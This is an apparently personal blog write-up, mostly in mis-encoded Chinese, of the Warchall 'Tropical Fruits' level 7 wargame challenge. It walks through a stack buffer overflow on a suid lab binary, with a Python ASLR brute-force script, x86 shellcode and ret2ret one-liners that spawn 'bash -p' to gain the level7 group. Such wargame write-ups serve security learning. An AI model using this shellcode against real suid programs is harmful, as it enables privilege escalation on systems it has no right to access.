<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.83.1"><title>Writeup-Training: Warchall - 7 Tropical Fruits - /home/cubarco</title><meta property="og:title" content="Writeup-Training: Warchall - 7 Tropical Fruits - /home/cubarco"><link href=https://cubl.in/favicon.ico rel=icon type=image/x-icon><meta name=description content="Hack, Python, Writeup"><link rel=stylesheet href=/css/main.min.3bcbe33ae5c46485bcebc6352fc91232f950eb735ccac53f81bd19d79251ba9c.css media=all></head><body><div class=wrapper><header class=header><nav class=nav><a href=/ class=nav-logo><img src=/images/logo-min.png width=50 height=50 alt=Logo></a><ul class=nav-links><li><a href=/>Index</a></li><li><a href=/tags/>Tags</a></li><li><a href=/about/>About</a></li><li><a href=/links/>Links</a></li><li><a href=https://github.com/cubarco/cubarco.github.io>GitHub</a></li></ul></nav></header><main class=content role=main><article class=article><h1 class=article-title>Writeup-Training: Warchall - 7 Tropical Fruits</h1><span class=article-date>2014-05-14</span>
<a class=article-tag href=/tags/hack>Hack</a>
<a class=article-tag href=/tags/python>Python</a>
<a class=article-tag href=/tags/writeup>Writeup</a><div class=article-content><p>Wechallçš„tropicè¿™é“é¢˜çœŸæ˜¯æ’¸å¾—æˆ‘è€ƒè¯•å‘¨å¤(yu)ä¹ (xi)éƒ½æ²¡å¿ƒæ€äº†ï¼ŒèŠ±äº†ä¸¤å¤©åŠç»ˆäºæå®šäº†ï¼Œæ‰63äººåšå‡ºæ¥çš„é¢˜ç›®å±…ç„¶æ˜¯trainingï¼ï¼ï¼</p><p>åšè¿™é¢˜çš„æ—¶å€™ä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€æ¬¡å†™shellcodeï¼Œä¸è¿‡è¿™é“é¢˜éš¾ç‚¹ä¸åœ¨äºshellcodeæ€ä¹ˆå†™ï¼Œè€Œåœ¨äºå‘çˆ¹çš„ASLRã€‚ä¸è¯´stackçš„åœ°å€ä¸€ç›´åœ¨å˜ï¼Œå±…ç„¶è¿linux-gate.soéƒ½åœ¨å˜ï¼</p><p>ä¸€å¼€å§‹æŸ¥äº†å¥½ä¹…ï¼Œå‘ç°ä¸ªæ€è·¯å«ret2libcï¼Œç„¶åæˆ‘gdbäº†ä¸€ä¸‹ï¼Œå‘ç°system()çš„åœ°å€è™½ç„¶æ˜¯éšæœºçš„ï¼Œä½†æ˜¯æœ‰6ä½æ˜¯ä¸å˜çš„ã€‚ç„¶åæˆ‘å°±æ’¸å•Šæ’¸ï¼Œæ’¸äº†ä¸ªshellè„šæœ¬ï¼Œé€Ÿåº¦ä¸é”™ï¼Œå±…ç„¶åŠåˆ†é’Ÿä¹‹å†…å°±èƒ½æŠŠsystem(â€œshâ€)è·‘å‡ºæ¥ã€‚çœ‹åˆ°â€sh-4.2$â€çš„æ—¶å€™æˆ‘é‚£å«ä¸€ä¸ªæ¿€åŠ¨å•Šã€‚å‘çˆ¹çš„æ˜¯system()è¿™è´§æ‰§è¡Œçš„æ—¶å€™å±…ç„¶ä¼šä¸¢æ‰suidçš„æƒé™(man system#NOTES)ã€‚</p><p>æ‰€ä»¥å¿™æ´»äº†ä¸€å¤©ï¼Œæˆ‘çš„æˆæœå°±æ˜¯ï¼Œåœ¨ä¸€ä¸ªshellä¸‹é¢ï¼Œå†å¼€ä¸€ä¸ªshellâ€¦â€¦</p><p>ç„¶åç¬¬äºŒå¤©æˆ‘ä¸ç”˜å¿ƒå•Šï¼Œå°±æ‰¾å•Šæ‰¾æ‰¾å•Šæ‰¾ï¼Œæ‰¾åˆ°äº†execå‡½æ•°æ—ã€‚</p><div class=highlight><pre class=chroma><code class=language-c data-lang=c><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span><span class=cp></span><span class=k>extern</span> <span class=kt>char</span> <span class=o>**</span><span class=n>environ</span><span class=p>;</span>
<span class=kt>int</span> <span class=nf>execl</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>path</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>arg</span><span class=p>,</span> <span class=p>...);</span>
<span class=kt>int</span> <span class=nf>execlp</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>file</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>arg</span><span class=p>,</span> <span class=p>...);</span>
<span class=kt>int</span> <span class=nf>execle</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>path</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>arg</span><span class=p>,</span> <span class=p>...,</span> <span class=kt>char</span> <span class=o>*</span> <span class=k>const</span> <span class=n>envp</span><span class=p>[]);</span>
<span class=kt>int</span> <span class=nf>execv</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>path</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=n>argv</span><span class=p>[]);</span>
<span class=kt>int</span> <span class=nf>execvp</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>file</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=n>argv</span><span class=p>[]);</span>
<span class=kt>int</span> <span class=nf>execve</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>path</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=n>argv</span><span class=p>[],</span> <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=n>envp</span><span class=p>[]);</span>
<span class=c1>//å…¶ä¸­åªæœ‰execveæ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå…¶å®ƒéƒ½æ˜¯åœ¨æ­¤åŸºç¡€ä¸Šç»è¿‡åŒ…è£…çš„åº“å‡½æ•°ã€‚
</span></code></pre></div><p>è¿™è´§å‰å®³ï¼Œsuidä¼šä¼ é€’ä¸‹å»ï¼Œä½†æ˜¯æ‚²å‚¬çš„æ˜¯æ¯ä¸ªå‡½æ•°çš„å‚æ•°ä¸æ­¢ä¸€ä¸ªï¼Œè€Œä¸”å¤§å¤šéƒ½è¦æ±‚æœ€åä¸€ä¸ªå‚æ•°ä¸ºNULL(ç›´æ¥æ— è§†)ï¼Œä½†æ˜¯execvä¹‹ç±»çš„å‡½æ•°åˆä¸æ–¹ä¾¿æ„é€ åé¢çš„é‚£äº›äºŒé˜¶æŒ‡é’ˆï¼Œæ‰€ä»¥æˆ‘æ˜¨å¤©å°±æ˜¯åœ¨æ»¡å±çš„Segmentation Faultä¸­åº¦è¿‡çš„ï¼Œå¶å°”å‡ºç°çš„Invalid Instructionèƒ½è®©äººé«˜å…´å¥½ä¸€é˜µã€‚</p><p>ç¬¬äºŒå¤©æ— æœï¼Œä¸è¿‡æˆ‘catäº†ä¸€ä¸‹compile7.shï¼Œå‘ç°äº†å¥½ç©çš„ä¸œè¥¿</p><div class=highlight><pre class=chroma><code class=language-shell data-lang=shell><span class=cp>#!/bin/bash
</span><span class=cp></span>gcc -fno-stack-protector -z execstack level7.c -o level7
chmod <span class=m>6755</span> level7
</code></pre></div><p>æ˜¯çš„â€¦å‡ºé¢˜è€…æŠŠDEPå…³æ‰äº†â€¦ç„¶åæˆ‘å°±ç¡ä¸ç€äº†</p><h2 id=è§£æ³•>è§£æ³•ï¼š</h2><p>ä»Šå¤©æ—©ä¸Šè€ƒå®Œç¦»æ•£å°±ç«‹é©¬èµ¶å›å¯å®¤ç»§ç»­æ’¸è¿™é“é¢˜ï¼Œè™½ç„¶è§£æ³•å¾ˆå¾ˆè ¢(å¯¹stackçš„5ä¸ªéšæœºä½è¿›è¡Œç¢°æ’)ï¼Œä½†æ˜¯è‡³å°‘èƒ½åœ¨10åˆ†é’Ÿå†…å‡ºç»“æœâ€¦â€¦</p><p>å…ˆç»™solution.txtå»ºä¸€ä¸ªåˆ°å·¥ä½œç›®å½•è½¯è¿æ¥:</p><div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>$ ln -s /home/level/tropic/7/solution.txt ./lk
</code></pre></div><p>ç„¶åè·‘è¿™ä¸ªpythonè„šæœ¬ï¼š</p><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=c1># -*- coding=utf8 -*-</span>
<span class=n>__author__</span> <span class=o>=</span> <span class=s1>&#39;Cubarco&#39;</span>


<span class=k>def</span> <span class=nf>tropic_crack</span><span class=p>():</span>
    <span class=k>try</span><span class=p>:</span>
        <span class=n>shellcode</span> <span class=o>=</span> <span class=s2>&#34;1</span><span class=se>\xc0\x99</span><span class=s2>Rh/cath/bin</span><span class=se>\x89\xe3</span><span class=s2>Rh./lk&#34;</span> \
                    <span class=s2>&#34;</span><span class=se>\x89\xe1\xb0\x0b</span><span class=s2>RQS</span><span class=se>\x89\xe1\xcd\x80</span><span class=s2>&#34;</span>
        <span class=n>stack_hex</span> <span class=o>=</span> <span class=nb>hex</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mh>0xbf00000</span><span class=p>,</span> <span class=mh>0xbffffff</span><span class=p>)</span><span class=o>*</span><span class=mh>0x10</span><span class=o>+</span><span class=mh>0x01</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
        <span class=n>stack_int</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>stack_hex</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span>
        <span class=n>path</span> <span class=o>=</span> <span class=s2>&#34;/home/level/tropic/7/level7&#34;</span>
        <span class=n>args</span> <span class=o>=</span> <span class=p>[</span><span class=n>path</span><span class=p>,</span>
                <span class=s1>&#39;</span><span class=se>\x90</span><span class=s1>&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>312</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>shellcode</span><span class=p>))</span>
                <span class=o>+</span> <span class=n>shellcode</span>
                <span class=o>+</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&amp;lt;L&#39;</span><span class=p>,</span> <span class=n>stack_int</span><span class=p>)]</span>
        <span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;(&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>(&#34;</span><span class=p>)</span>\
                         <span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\\\&#34;</span><span class=s2>&#34;</span><span class=p>)</span>\
                         <span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;)&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>)&#34;</span><span class=p>)</span>\
                         <span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\\</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\\\\</span><span class=s2>&#34;</span><span class=p>)</span>\
                         <span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\&#39;</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\\\&#39;</span><span class=s2>&#34;</span><span class=p>)</span>
        <span class=n>p</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>args</span><span class=p>,</span>
                             <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span>
                             <span class=n>stderr</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span>
                             <span class=n>shell</span><span class=o>=</span><span class=bp>False</span><span class=p>)</span>
        <span class=n>rsp</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
        <span class=k>if</span> <span class=n>rsp</span> <span class=o>!=</span> <span class=s1>&#39;&#39;</span><span class=p>:</span>
            <span class=k>print</span> <span class=n>rsp</span>
    <span class=k>except</span><span class=p>:</span>
        <span class=c1># print traceback.format_exc()</span>
        <span class=c1># å¥½åƒsubprocesså¼€å¤ªå¿«äº†ä¼šå‡ºé—®é¢˜...</span>
        <span class=k>pass</span>


<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
    <span class=kn>import</span> <span class=nn>struct</span>
    <span class=kn>import</span> <span class=nn>random</span>
    <span class=kn>import</span> <span class=nn>subprocess</span>
    <span class=kn>import</span> <span class=nn>traceback</span>
    
    <span class=k>while</span> <span class=bp>True</span><span class=p>:</span>
        <span class=n>tropic_crack</span><span class=p>()</span>
</code></pre></div><p>åšå®Œé¢˜å»é¢˜è§£è®¨è®ºåŒºçœ‹åˆ°ä¸ªret2retçš„æ€è·¯æ„Ÿè§‰å¥½æ£’ï¼Œæœ‰æ—¶é—´ç ”ç©¶ä¸€ä¸‹ã€‚</p><p>å¯¹äº†ï¼Œè·‘è„šæœ¬çš„æ—¶å€™å¦‚æœå®ƒå¡ä½äº†è€Œä¸”ctrl+cå…³ä¸æ‰è¯·ä¸è¦æ¥æ‰“æˆ‘ã€‚æ­£ç¡®å§¿åŠ¿æ˜¯killallâ€¦..</p><p>UPDATE: åˆšçœ‹äº†ä¸€ä¸‹ret2retï¼Œæˆ‘æƒ³å»æ­»ä¸€æ­»äº†ã€‚æ˜¯çš„ï¼Œåªç”¨ä¸‹é¢ä¸€å¥è¯å°±èƒ½æå®šï¼Œohï¼Œå‰æè¿˜æ˜¯ç»™solution.txtå»ºç«‹ä¸€ä¸ªåˆ°å·¥ä½œç›®å½•çš„è½¯é“¾æ¥ï¼Œåå­—æ˜¯lkï¼ˆå…¶å®æ˜¯å› ä¸º./lkåˆšå¥½æ˜¯å››å­—èŠ‚ï¼Œ å¦‚æœç”¨åŸæ¥çš„è·¯å¾„å¥½éº»çƒ¦è¿˜è¦å››å­—èŠ‚å¯¹é½ï¼Œå·ä¸ªæ‡’ï¼‰</p><div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>$ /home/level/tropic/7/level7 <span class=sb>`</span>python -c <span class=s2>&#34;print &#39;\x90&#39;*(312-33)+&#39;1\xc0\x99Rh/cath/bin\x89\xe3Rh./lk\x89\xe1\xb0\x0bRQS\x89\xe1\xcd\x80&#39;+&#39;\xd2\x84\x04\x08&#39;&#34;</span><span class=sb>`</span>
<span class=c1># 0x080484d2æ˜¯ç¨‹åºé‡Œé¢ä¸€ä¸ªæ‰§è¡ŒretæŒ‡ä»¤çš„åœ°å€ï¼Œéšä¾¿æŒ‘ï¼</span>
</code></pre></div><p>æ›´BTä¸€ç‚¹è¿˜å¯ä»¥è¿™æ ·ï¼Œè·‘ä¸€ä¸ª/bin/bash -pï¼š</p><div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>$ /home/level/tropic/7/level7 <span class=sb>`</span>python -c <span class=s2>&#34;print &#39;\x90&#39;*(312-33)+&#39;j\x0bX\x99Rfh-p\x89\xe1Rjhh/bash/bin\x89\xe3RQS\x89\xe1\xcd\x80&#39;+&#39;\xd2\x84\x04\x08&#39;&#34;</span><span class=sb>`</span>
bash-4.2$ id
<span class=nv>uid</span><span class=o>=</span>4057<span class=o>(</span>cubarco<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>4057<span class=o>(</span>cubarco<span class=o>)</span> <span class=nv>egid</span><span class=o>=</span>1008<span class=o>(</span>level7<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>4057<span class=o>(</span>cubarco<span class=o>)</span>
<span class=c1># ç„¶åä½ å°±æœ‰level7çš„egidäº†...</span>
</code></pre></div><h2 id=å‚è€ƒ>Â å‚è€ƒï¼š</h2><ol><li>Hackers Hut#<a href=http://www.win.tue.nl/~aeb/linux/hh/hh-10.html>Smashing The Stack</a>(ASLR bypassing overview)</li><li><a href=http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf>Performing a ret2libc Attack</a>(ret2libc)</li><li><a href=http://www.cis.syr.edu/~wedu/seed/Labs/Vulnerability/Return_to_libc/Return_to_libc.pdf>Return-to-libc Attack Lab</a>(ret2libc)</li><li><a href=http://web.textfiles.com/hacking/smackthestack.txt>Smack the Stack</a>(ret2ret)</li></ol></div></article><script src=https://utteranc.es/client.js repo=cubarco/cubarco.github.io issue-term=pathname label="Comments ğŸ’¬" theme=boxy-light crossorigin=anonymous async defer></script></main><footer class=footer><ul class=footer-links><li><a href=/index.xml type=application/rss+xml target=_blank>RSS feed</a></li><li><a href=https://gohugo.io/ class=footer-links-kudos target=_blank rel="noopener norefferrer">Made with <img src=/images/hugo-logo.png alt="Img link to Hugo website" width=22 height=22></a></li><li><a>Â© 2014 - 2014</a></li></ul></footer></div><script async src=https://cdn.jsdelivr.net/gh/cubarco/cubarco.github.io@gh-pages/js/async.min.f0ee05a5180b84c9031dc6048a165e3238369671eaac5df72f9fc961a2bb03f78685ba489261432234bcbad8b66c86ffa90cffd19f60c4b28ef06e677fc9763f.js onload=window.GistEmbed.init()></script><script async defer src=https://cdn.jsdelivr.net/npm/instant.page@5.1.0/instantpage.min.js></script><script>window.ga_tid="UA-54867602-1",window.ga_api="https://cubl.in/ga-proxy/"</script><script src=https://cdn.jsdelivr.net/npm/cfga@1.0.3 async defer></script><script async defer data-website-id=e9fdcc32-0bfa-4de5-beb0-3bbf1e4638ab src=https://umami.2oo.in/umami.js></script></body></html>